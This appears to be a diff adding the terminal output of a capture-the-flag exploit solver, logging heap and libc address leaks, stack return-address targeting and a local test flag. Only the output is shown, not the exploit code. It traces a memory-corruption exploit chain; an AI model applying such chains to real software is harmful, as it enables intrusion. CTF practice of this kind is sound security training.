@@ -1,0 +1,9 @@
+$ python3 solve.py
+[+] heap hdr leak (largebin nextsize): 0x555581a527c0
+[+] hdr_a: 0x555581a53c00 fake: 0x555581a53c10
+[+] unsorted bk leak: 0x7f195f626b20
+[+] libc base: 0x7f195f43f000
+[+] environ: 0x7f195f62de28
+[+] stack environ: 0x7fff9126ca48
+[+] ret_addr: 0x7fff9126c8f8 stack_target: 0x7fff9126c8f0
+0xfun{LOCAL_TEST_FLAG}
